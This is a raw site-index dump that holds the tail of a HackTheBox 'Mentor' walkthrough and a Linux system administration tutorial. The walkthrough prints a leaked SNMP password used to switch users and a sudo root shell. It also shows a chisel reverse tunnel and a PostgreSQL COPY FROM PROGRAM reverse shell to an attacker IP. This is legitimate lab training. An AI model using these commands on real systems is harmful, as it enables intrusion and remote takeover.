/usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.4 -container-port 80 PostgreSQL is running on port 5432.\nNetwork Services ss -tlnp State Recv-Q Send-Q Local Address:Port Peer Address:Port Process LISTEN 0 4096 172.22.0.1:81 0.0.0.0:* LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 4096 172.22.0.1:5432 0.0.0.0:* LISTEN 0 4096 127.0.0.1:38173 0.0.0.0:* LISTEN 0 4096 172.22.0.1:8000 0.0.0.0:* LISTEN 0 511 *:80 *:* LISTEN 0 128 [::]:22 [::]:* Apache Configuration cat /etc/apache2/sites-available/000-default.conf \u0026lt;VirtualHost *:80\u0026gt; ProxyPreserveHost On ServerName mentorquotes.htb ServerAdmin admin@mentorquotes.htb ProxyPass / http://172.22.0.1:81/ ProxyPassReverse / http://172.22.0.1:81/ RewriteEngine On RewriteCond %{HTTP_HOST} !^mentorquotes.htb$ RewriteRule /.* http://mentorquotes.htb/ [R] ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; ServerName api.mentorquotes.htb ServerAdmin admin@mentorquotes.htb ProxyPass / http://172.22.0.1:8000/ ProxyPassReverse / http://172.22.0.1:8000/ ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined \u0026lt;/VirtualHost\u0026gt; Finding Configuration Files Let\u0026rsquo;s look for files modified around the SSH key creation date:\nfind /etc -type f -newermt 2022-06-03 ! -newermt 2022-06-14 -ls 2\u0026gt;/dev/null SNMP Configuration grep -v \u0026#39;^#\u0026#39; /etc/snmp/snmpd.conf Critical Finding:\ncreateUser bootstrap MD5 SuperSecurePassword123__ DES rouser bootstrap priv com2sec AllUser default internal group AllGroup v2c AllUser view SystemView included .1.3.6.1.2.1.25.1.1 view AllView included .1 access AllGroup \u0026#34;\u0026#34; any noauth exact AllView none none We found another password: SuperSecurePassword123__\nUser Enumeration cat /etc/passwd | grep sh root:x:0:0:root:/root:/bin/bash sshd:x:106:65534::/run/sshd:/usr/sbin/nologin svc:x:1001:1001:,,,:/home/svc:/bin/bash james:x:1000:1000:,,,:/home/james:/bin/bash fwupd-refresh:x:115:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin Privilege Escalation to James Let\u0026rsquo;s try the SNMP password for the james user:\nsu james # Password: SuperSecurePassword123__ Sudo Privileges sudo -l Matching Defaults entries for james on mentor: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User james may run the following commands on mentor: (ALL) /bin/sh Root Access Perfect! James can run /bin/sh as root:\nsudo /bin/sh Additional Techniques Chisel for Port Forwarding If we needed to access the PostgreSQL database remotely:\n# On Kali machine ./chisel server -p 8001 --reverse -v # On target machine ./chisel client 10.10.14.13:8001 R:5432:172.22.0.1:5432 # Connect to database psql postgresql://postgres:postgres@127.0.0.1/mentorquotes_db PostgreSQL Command Execution -- List databases \\l -- List tables \\dt -- View table structure \\d+ users -- Create command execution table DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); -- Execute system commands COPY cmd_exec FROM PROGRAM \u0026#39;hostname\u0026#39;; SELECT * FROM cmd_exec; -- Reverse shell via PostgreSQL COPY cmd_exec FROM PROGRAM \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.8/9001 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;; Docker Container Analysis # List running containers docker ps # Access container docker exec -it 29af sh # Create archive of application tar -cjvf app.tar.bz2 app # Copy from container to host docker cp 29af:/app.tar.bz2 /dev/shm/ # Extract and analyze tar -xjvf app.tar.bz2 ls -l app/ # Search for credentials grep -Ri \u0026#34;password\\|secret\\|key\\|token\u0026#34; app/ Summary This walkthrough demonstrated:\nReconnaissance: Nmap scanning revealed SSH, HTTP, and SNMP services Web Enumeration: Discovered API subdomain with FastAPI documentation SNMP Exploitation: Found hardcoded password in process arguments API Exploitation: Command injection via backup endpoint Container Escape: Analysis of Docker environment Credential Harvesting: Hash cracking and database access Privilege Escalation: SNMP configuration revealed additional credentials Root Access: Sudo privileges allowed elevation to root Key Lessons:\nNever hardcode passwords in command line arguments SNMP can reveal sensitive system information API documentation can expose attack vectors Multiple privilege escalation paths often exist Container environments require different enumeration techniques This machine effectively demonstrated real-world vulnerabilities including credential exposure, command injection, and misconfigurations leading to privilege escalation.\n","permalink":"https://realspaceeagle.github.io/posts/hackthebox-mentor-walkthrough/","summary":"Complete penetration testing walkthrough of HackTheBox Mentor machine covering reconnaissance, enumeration, exploitation, and privilege escalation with detailed explanations and screenshots.","title":"HackTheBox: Mentor Walkthrough"},{"content":"Linux System Administration Essentials Essential commands and techniques for Linux system administration, covering everything from basic operations to advanced automation.\nSystem Information Basic System Info # System information $ uname -a Linux server01 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 \\ x86_64 x86_64 x86_64 GNU/Linux # CPU information $ lscpu Architecture: x86_64 CPU op-mode(s): 32-bit, 64-bit Byte Order: Little Endian Address sizes: 39 bits physical, 48 bits virtual CPU(s): 4 On-line CPU(s) list: 0-3 Thread(s) per core: 2 Core(s) per socket: 2 Socket(s): 1 Vendor ID: GenuineIntel CPU family: 6 Model: 142 Model name: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz Stepping: 10 CPU MHz: 1800.000 CPU max MHz: 3400.0000 CPU min MHz: 400.0000 BogoMIPS: 3600.00 Virtualization: VT-x L1d cache: 32K L1i cache: 32K L2 cache: 256K L3 cache: 6144K Memory and Storage # Memory usage $ free -h total used free shared buff/cache available Mem: 7.7G 2.1G 4.2G 45M 1.4G 5.3G Swap: 2.0G 0B 2.0G # Disk usage $ df -h Filesystem Size Used Avail Use% Mounted on /dev/sda1 20G 8.5G 11G 45% / /dev/sda2 100G 45G 50G 48% /home tmpfs 3.9G 0 3.9G 0% /dev/shm tmpfs 3.9G 8.0M 3.9G 1% /run tmpfs 3.9G 0 3.9G 0% /sys/fs/cgroup Process Management Process Monitoring # Running processes $ ps aux | head -10 USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.1 168032 11984 ? Ss Jan25 0:01 /sbin/init root 2 0.0 0.0 0 0 ? S Jan25 0:00 [kthreadd] root 3 0.0 0.0 0 0 ? I\u0026lt; Jan25 0:00 [rcu_gp] root 4 0.0 0.0 0 0 ? I\u0026lt; Jan25 0:00 [rcu_par_gp] root 6 0.0 0.0 0 0 ? I\u0026lt; Jan25 0:00 [kworker/0:0H-kblockd] root 8 0.0 0.0 0 0 ? I\u0026lt; Jan25 0:00 [mm_percpu_wq] root 9 0.0 0.0 0 0 ? S Jan25 0:00 [ksoftirqd/0] root 10 0.0 0.0 0 0 ? I\u0026lt; Jan25 0:00 [rcu_sched] root 11 0.0 0.0 0 0 ? I\u0026lt; Jan25 0:00 [rcu_bh] root 12 0.0 0.0 0 0 ? S Jan25 0:00 [migration/0] # Process tree $ pstree systemd‚îÄ‚î¨‚îÄModemManager‚îÄ‚îÄ‚îÄ2*[{ModemManager}] ‚îú‚îÄNetworkManager‚îÄ‚îÄ‚îÄ2*[{NetworkManager}] ‚îú‚îÄaccounts-daemon‚îÄ‚îÄ‚îÄ2*[{accounts-daemon}] ‚îú‚îÄacpid ‚îú‚îÄavahi-daemon‚îÄ‚îÄ‚îÄavahi-daemon ‚îú‚îÄbluetoothd ‚îú‚îÄcolord‚îÄ‚îÄ‚îÄ2*[{colord}] ‚îú‚îÄcron ‚îú‚îÄdbus-daemon ‚îú‚îÄgdm3‚îÄ‚îÄ‚îÄgdm-session-wor‚îÄ‚îÄ‚îÄgdm-wayland-ses‚îÄ‚îÄ‚îÄgnome-session-b‚îÄ‚îÄ‚îÄ\\ gnome-session-c‚îÄ‚îÄ‚îÄgnome-shell‚îÄ‚îÄ‚îÄ3*[{gnome-shell}] ‚îú‚îÄirqbalance ‚îú‚îÄkerneloops ‚îú‚îÄpackagekitd‚îÄ‚îÄ‚îÄ2*[{packagekitd}] ‚îú‚îÄpolkitd‚îÄ‚îÄ‚îÄ2*[{polkitd}] ‚îú‚îÄrsyslogd‚îÄ‚îÄ‚îÄ3*[{rsyslogd}] ‚îú‚îÄsnapd‚îÄ‚îÄ‚îÄ8*[{snapd}] ‚îú‚îÄsystemd‚îÄ‚î¨‚îÄ(sd-pam) ‚îÇ ‚îî‚îÄuser@1000.service‚îÄ‚î¨‚îÄdbus-daemon ‚îÇ ‚îú‚îÄgnome-keyring-d‚îÄ‚îÄ‚îÄ3*[{gnome-keyring-d}] ‚îÇ ‚îú‚îÄpulseaudio‚îÄ‚îÄ‚îÄ2*[{pulseaudio}] ‚îÇ ‚îî‚îÄtracker-miner-f‚îÄ‚îÄ‚îÄ2*[{tracker-miner-f}] ‚îú‚îÄsystemd-journal ‚îú‚îÄsystemd-logind ‚îú‚îÄsystemd-resolve ‚îú‚îÄsystemd-timesyn‚îÄ‚îÄ‚îÄ{systemd-timesyn} ‚îú‚îÄsystemd-udevd ‚îú‚îÄthermald‚îÄ‚îÄ‚îÄ4*[{thermald}] ‚îú‚îÄudisksd‚îÄ‚îÄ‚îÄ4*[{udisksd}] ‚îú‚îÄunattended-upgr‚îÄ‚îÄ‚îÄ{unattended-upgr} ‚îú‚îÄupowerd‚îÄ‚îÄ‚îÄ2*[{upowerd}] ‚îú‚îÄwhoopsie‚îÄ‚îÄ‚îÄ2*[{whoopsie}] ‚îî‚îÄwpa_supplicant Service Management Systemd Services # Service status $ systemctl status apache2 ‚óè apache2.service - The Apache HTTP Server Loaded: loaded (/lib/systemd/system/apache2.service; enabled; vendor preset: enabled) Active: active (running) since Mon 2024-01-30 10:00:00 UTC; 2h 15min ago Docs: https://httpd.apache.org/docs/2.4/ Main PID: 1234 (apache2) Tasks: 55 (limit: 4915) Memory: 12.5M CGroup: /system.slice/apache2.service ‚îú‚îÄ1234 /usr/sbin/apache2 -k start ‚îú‚îÄ1235 /usr/sbin/apache2 -k start ‚îî‚îÄ1236 /usr/sbin/apache2 -k start Jan 30 10:00:00 server01 systemd[1]: Starting The Apache HTTP Server... Jan 30 10:00:00 server01 apache2[1234]: AH00558: apache2: Could not reliably \\ determine the server\u0026#39;s fully qualified domain name Jan 30 10:00:00 server01 systemd[1]: Started The Apache HTTP Server. # Start/stop services $ sudo systemctl start apache2 $ sudo systemctl stop apache2 $ sudo systemctl restart apache2 $ sudo systemctl reload apache2 # Enable/disable services $ sudo systemctl enable apache2 $ sudo systemctl disable apache2 Log Management System Logs # System log $ journalctl -u apache2 -- Logs begin at Mon 2024-01-30 10:00:00 UTC, end at Mon 2024-01-30 12:15:00 UTC. -- Jan 30 10:00:00 server01 systemd[1]: Starting The Apache HTTP Server... Jan 30 10:00:00 server01 apache2[1234]: AH00558: apache2: Could not reliably \\ determine the server\u0026#39;s fully qualified domain name Jan 30 10:00:00 server01 systemd[1]: Started The Apache HTTP Server. # Real-time log monitoring $ journalctl -u apache2 -f -- Logs begin at Mon 2024-01-30 10:00:00 UTC. -- Jan 30 12:15:00 server01 apache2[1234]: [client 192.168.1.100:45678] \u0026#34;GET / HTTP/1.1\u0026#34; 200 1234 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\u0026#34; Jan 30 12:15:01 server01 apache2[1234]: [client 192.168.1.101:45679] \u0026#34;GET /favicon.ico HTTP/1.1\u0026#34; 404 1234 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\u0026#34; Advanced Log Analysis # Analyze failed login attempts $ journalctl _SYSTEMD_UNIT=ssh.service | grep \u0026#34;Failed password\u0026#34; Jan 30 12:30:00 server01 sshd[5678]: Failed password for invalid user admin from 192.168.1.200 port 45123 ssh2 Jan 30 12:30:05 server01 sshd[5679]: Failed password for root from 192.168.1.200 port 45124 ssh2 # Find most frequent error patterns $ journalctl --since \u0026#34;1 hour ago\u0026#34; -p err | awk \u0026#39;{print $5}\u0026#39; | sort | uniq -c | sort -rn 15 apache2[1234]: 8 systemd[1]: 3 kernel: # Monitor authentication logs $ tail -f /var/log/auth.log | grep --line-buffered -E \u0026#34;(Failed|Accepted)\u0026#34; Jan 30 12:45:00 server01 sshd[6789]: Accepted publickey for user1 from 192.168.1.150 port 52341 ssh2 Jan 30 12:45:30 server01 sshd[6790]: Failed password for invalid user test from 192.168.1.200 port 52342 ssh2 # Parse Apache access logs for suspicious activity $ awk \u0026#39;$9 ~ /^4/ || $9 ~ /^5/ {print $0}\u0026#39; /var/log/apache2/access.log | tail -10 192.168.1.200 - - [30/Jan/2024:12:50:00 +0000] \u0026#34;GET /admin HTTP/1.1\u0026#34; 404 1234 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0\u0026#34; 192.168.1.201 - - [30/Jan/2024:12:50:15 +0000] \u0026#34;POST /login HTTP/1.1\u0026#34; 500 2345 \u0026#34;-\u0026#34; \u0026#34;curl/7.68.0\u0026#34; # Log analysis with grep patterns $ grep -E \u0026#34;(error|fail|denied|invalid)\u0026#34; /var/log/syslog | tail -5 Jan 30 13:00:00 server01 kernel: [12345.678] USB disconnect, address 1 Jan 30 13:00:15 server01 NetworkManager[1111]: \u0026lt;error\u0026gt; failed to connect to wireless network Automation Scripts System Health Check Script #!/bin/bash # System health check script echo \u0026#34;=== System Health Check ===\u0026#34; echo \u0026#34;Date: $(date)\u0026#34; echo \u0026#34;Hostname: $(hostname)\u0026#34; echo \u0026#34;Uptime: $(uptime)\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;=== CPU Usage ===\u0026#34; top -bn1 | grep \u0026#34;Cpu(s)\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | cut -d\u0026#39;%\u0026#39; -f1 echo \u0026#34;=== Memory Usage ===\u0026#34; free -h | grep Mem | awk \u0026#39;{print \u0026#34;Used: \u0026#34; $3 \u0026#34; / \u0026#34; $2 \u0026#34; (\u0026#34; $3/$2*100 \u0026#34;%)\u0026#34;}\u0026#39; echo \u0026#34;=== Disk Usage ===\u0026#34; df -h | grep -E \u0026#39;^/dev/\u0026#39; | awk \u0026#39;{print $1 \u0026#34;: \u0026#34; $3 \u0026#34; / \u0026#34; $2 \u0026#34; (\u0026#34; $5 \u0026#34;)\u0026#34;}\u0026#39; echo \u0026#34;=== Top Processes ===\u0026#34; ps aux --sort=-%cpu | head -5 echo \u0026#34;=== Network Connections ===\u0026#34; netstat -tuln | grep LISTEN | wc -l echo \u0026#34;=== Service Status ===\u0026#34; systemctl is-active apache2 systemctl is-active mysql systemctl is-active ssh Backup Script #!/bin/bash # Automated backup script BACKUP_DIR=\u0026#34;/backups\u0026#34; SOURCE_DIR=\u0026#34;/var/www/html\u0026#34; DATE=$(date +%Y%m%d_%H%M%S) BACKUP_FILE=\u0026#34;backup_${DATE}.tar.gz\u0026#34; # Create backup directory if it doesn\u0026#39;t exist mkdir -p $BACKUP_DIR # Create backup echo \u0026#34;Creating backup: $BACKUP_FILE\u0026#34; tar -czf \u0026#34;${BACKUP_DIR}/${BACKUP_FILE}\u0026#34; -C /var/www html # Verify backup if [ -f \u0026#34;${BACKUP_DIR}/${BACKUP_FILE}\u0026#34; ]; then echo \u0026#34;Backup created successfully: ${BACKUP_DIR}/${BACKUP_FILE}\u0026#34; echo \u0026#34;Backup size: $(du -h \u0026#34;${BACKUP_DIR}/${BACKUP_FILE}\u0026#34; | cut -f1)\u0026#34; else echo \u0026#34;Backup failed!\u0026#34; exit 1 fi # Clean old backups (keep last 7 days) find $BACKUP_DIR -name \u0026#34;backup_*.tar.gz\u0026#34; -mtime +7 -delete echo \u0026#34;Old backups cleaned up\u0026#34; Security Hardening Firewall Configuration # UFW (Uncomplicated Firewall) $ sudo ufw status Status: active To Action From -- ------ ---- 22/tcp ALLOW Anywhere 80/tcp ALLOW Anywhere 443/tcp ALLOW Anywhere 22/tcp (v6) ALLOW Anywhere (v6) 80/tcp (v6) ALLOW Anywhere (v6) 443/tcp (v6) ALLOW Anywhere (v6) # Configure firewall rules $ sudo ufw default deny incoming $ sudo ufw default allow outgoing $ sudo ufw allow ssh $ sudo ufw allow 80/tcp $ sudo ufw allow 443/tcp $ sudo ufw enable SSH Hardening # SSH configuration $ sudo nano /etc/ssh/sshd_config # Key settings: Port 2222 PermitRootLogin no PasswordAuthentication no PubkeyAuthentication yes MaxAuthTries 3 ClientAliveInterval 300 ClientAliveCountMax 2 # Restart SSH service $ sudo systemctl restart ssh Container Management Docker Operations # List running containers $ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES a1b2c3d4e5f6 nginx:latest \u0026#34;nginx\u0026#34; 2 hours ago Up 2 hours 0.0.0.0:80-\u0026gt;80/tcp webserver 7g8h9i0j1k2l mysql:8.0 \u0026#34;mysqld\u0026#34; 2 hours ago Up 2 hours 0.0.0.0:3306-\u0026gt;3306/tcp database # Container resource usage $ docker stats CONTAINER ID NAME CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O PIDS a1b2c3d4e5f6 webserver 0.05% 12.34MiB / 1.943GiB 0.62% 1.23kB / 0B 0B / 0B 3 7g8h9i0j1k2l database 0.15% 123.4MiB / 1.943GiB 6.20% 0B / 0B 0B / 0B 37 # Container logs $ docker logs webserver --tail 50 -f 192.168.1.100 - - [30/Jan/2024:12:00:00 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 1234 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0\u0026#34; 192.168.1.101 - - [30/Jan/2024:12:00:01 +0000] \u0026#34;GET /favicon.ico HTTP/1.1\u0026#34; 404 162 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0\u0026#34; # Execute commands in container $ docker exec -it webserver /bin/bash root@a1b2c3d4e5f6:/# ls -la total 12 drwxr-xr-x 1 root root 4096 Jan 30 12:00 . drwxr-xr-x 1 root root 4096 Jan 30 12:00 .. drwxr-xr-x 2 root root 4096 Jan 30 11:30 var Container Security Monitoring # Check container security with docker-bench-security $ git clone https://github.com/docker/docker-bench-security.git $ cd docker-bench-security $ sudo ./docker-bench-security.sh # Container vulnerability scanning $ docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \\ -v /tmp:/tmp anchore/syft:latest packages docker:nginx:latest # Monitor container network connections $ docker exec webserver netstat -tuln Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN tcp6 0 0 :::80 :::* LISTEN Performance Monitoring System Metrics # CPU and memory monitoring $ htop # Interactive process viewer with real-time metrics # I/O monitoring $ iostat -x 1 Linux 5.4.0-74-generic (server01) 01/30/2024 _x86_64_ (4 CPU) avg-cpu: %user %nice %system %iowait %steal %idle 2.50 0.00 1.25 0.25 0.00 96.00 Device r/s w/s rkB/s wkB/s rrqm/s wrqm/s %rrqm %wrqm r_await w_await aqu-sz rareq-sz wareq-sz svctm %util sda 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Conclusion These Linux system administration techniques provide a solid foundation for managing and maintaining Linux systems. Regular monitoring, automation, and security hardening are essential for production environments.\nAlways test commands in a safe environment before running them on production systems.\n","permalink":"https://realspaceeagle.github.io/posts/linux-system-administration/","summary":"\u003ch1 id=\"linux-system-administration-essentials\"\u003eLinux System Administration Essentials\u003c/h1\u003e\n\u003cp\u003eEssential commands and techniques for Linux system administration, covering everything from basic operations to advanced automation.\u003c/p\u003e\n\u003ch2 id=\"system-information\"\u003eSystem Information\u003c/h2\u003e\n\u003ch3 id=\"basic-system-info\"\u003eBasic System Info\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# System information\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ uname -a\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLinux server01 5.4.0-74-generic \u003cspan class=\"c1\"\u003e#83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 \\\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ex86_64 x86_64 x86_64 GNU/Linux\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# CPU information\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ lscpu\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eArchitecture:                    x86_64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCPU op-mode\u003cspan class=\"o\"\u003e(\u003c/span\u003es\u003cspan class=\"o\"\u003e)\u003c/span\u003e:                  32-bit, 64-bit\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eByte Order:                      Little Endian\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAddress sizes:                   \u003cspan class=\"m\"\u003e39\u003c/span\u003e bits physical, \u003cspan class=\"m\"\u003e48\u003c/span\u003e bits virtual\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCPU\u003cspan class=\"o\"\u003e(\u003c/span\u003es\u003cspan class=\"o\"\u003e)\u003c/span\u003e:                          \u003cspan class=\"m\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eOn-line CPU\u003cspan class=\"o\"\u003e(\u003c/span\u003es\u003cspan class=\"o\"\u003e)\u003c/span\u003e list:              0-3\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThread\u003cspan class=\"o\"\u003e(\u003c/span\u003es\u003cspan class=\"o\"\u003e)\u003c/span\u003e per core:              \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCore\u003cspan class=\"o\"\u003e(\u003c/span\u003es\u003cspan class=\"o\"\u003e)\u003c/span\u003e per socket:              \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSocket\u003cspan class=\"o\"\u003e(\u003c/span\u003es\u003cspan class=\"o\"\u003e)\u003c/span\u003e:                       \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eVendor ID:                       GenuineIntel\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCPU family:                      \u003cspan class=\"m\"\u003e6\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eModel:                           \u003cspan class=\"m\"\u003e142\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eModel name:                      Intel\u003cspan class=\"o\"\u003e(\u003c/span\u003eR\u003cspan class=\"o\"\u003e)\u003c/span\u003e Core\u003cspan class=\"o\"\u003e(\u003c/span\u003eTM\u003cspan class=\"o\"\u003e)\u003c/span\u003e i5-8250U CPU @ 1.60GHz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStepping:                        \u003cspan class=\"m\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCPU MHz:                         1800.000\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCPU max MHz:                     3400.0000\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCPU min MHz:                     400.0000\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBogoMIPS:                        3600.00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eVirtualization:                  VT-x\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eL1d cache:                       32K\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eL1i cache:                       32K\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eL2 cache:                        256K\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eL3 cache:                        6144K\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"memory-and-storage\"\u003eMemory and Storage\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Memory usage\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ free -h\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e              total        used        free      shared  buff/cache   available\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eMem:           7.7G        2.1G        4.2G         45M        1.4G        5.3G\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSwap:          2.0G          0B        2.0G\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Disk usage\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ df -h\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFilesystem      Size  Used Avail Use% Mounted on\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda1        20G  8.5G   11G  45% /\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda2       100G   45G   50G  48% /home\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etmpfs           3.9G     \u003cspan class=\"m\"\u003e0\u003c/span\u003e  3.9G   0% /dev/shm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etmpfs           3.9G  8.0M  3.9G   1% /run\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etmpfs           3.9G     \u003cspan class=\"m\"\u003e0\u003c/span\u003e  3.9G   0% /sys/fs/cgroup\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"process-management\"\u003eProcess Management\u003c/h2\u003e\n\u003ch3 id=\"process-monitoring\"\u003eProcess Monitoring\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Running processes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ ps aux \u003cspan class=\"p\"\u003e|\u003c/span\u003e head -10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroot           \u003cspan class=\"m\"\u003e1\u003c/span\u003e  0.0  0.1 \u003cspan class=\"m\"\u003e168032\u003c/span\u003e \u003cspan class=\"m\"\u003e11984\u003c/span\u003e ?        Ss   Jan25   0:01 /sbin/init\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 